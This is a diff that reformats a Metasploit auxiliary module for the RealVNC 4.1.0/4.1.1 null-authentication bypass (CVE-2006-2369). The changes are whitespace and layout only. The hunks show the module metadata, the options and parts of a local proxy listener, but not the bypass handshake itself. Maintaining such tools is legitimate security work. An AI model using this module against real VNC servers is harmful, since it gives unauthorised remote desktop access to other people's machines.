@@ -7,37 +7,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'RealVNC NULL Authentication Mode Bypass',
-      'Description'    => %q{
-        This module exploits an Authentication bypass Vulnerability
-        in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
-        listener on LPORT and proxies to the target server
+    super(
+      update_info(
+        info,
+        'Name' => 'RealVNC NULL Authentication Mode Bypass',
+        'Description' => %q{
+          This module exploits an Authentication bypass Vulnerability
+          in RealVNC Server version 4.1.0 and 4.1.1. It sets up a proxy
+          listener on LPORT and proxies to the target server
 
-        The AUTOVNC option requires that vncviewer be installed on
-        the attacking machine.
-      },
-      'Author'         =>
-        [
-          'hdm', #original msf2 module
+          The AUTOVNC option requires that vncviewer be installed on
+          the attacking machine.
+        },
+        'Author' => [
+          'hdm', # original msf2 module
           'theLightCosine'
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['BID', '17978'],
           ['OSVDB', '25479'],
           ['URL', 'http://secunia.com/advisories/20107/'],
           ['CVE', '2006-2369'],
         ],
-      'DisclosureDate' => '2006-05-15'))
+        'DisclosureDate' => '2006-05-15'
+      )
+    )
 
     register_options(
       [
-        OptPort.new('RPORT',    [true, "The port the target VNC Server is listening on", 5900 ]),
-        OptPort.new('LPORT',    [true, "The port the local VNC Proxy should listen on", 5900 ]),
-        OptBool.new('AUTOVNC',  [true, "Automatically launch vncviewer from this host", false])
-      ])
+        OptPort.new('RPORT', [true, "The port the target VNC Server is listening on", 5900 ]),
+        OptPort.new('LPORT', [true, "The port the local VNC Proxy should listen on", 5900 ]),
+        OptBool.new('AUTOVNC', [true, "Automatically launch vncviewer from this host", false])
+      ]
+    )
   end
 
   def run
@@ -46,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     listener = Rex::Socket::TcpServer.create(
       'LocalHost' => '0.0.0.0',
       'LocalPort' => datastore['LPORT'],
-      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
+      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
     )
 
     # If the autovnc option is set to true this will spawn a vncviewer on the lcoal machine
@@ -58,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       print_status("Spawning viewer thread...")
       view = framework.threads.spawn("VncViewerWrapper", false) {
-          system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
+        system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
       }
     end
 
@@ -93,12 +96,12 @@ class MetasploitModule < Msf::Auxiliary
 
     # Handles remaining proxy operations between the two sockets
     closed = false
-    while(closed == false)
-      sockets =[]
+    while (closed == false)
+      sockets = []
       sockets << client
       sockets << s
-      selected = select(sockets,nil,nil,0)
-      #print_status ("Selected: #{selected.inspect}")
+      selected = select(sockets, nil, nil, 0)
+      # print_status ("Selected: #{selected.inspect}")
       unless selected.nil?
 
         if selected[0].include?(client)
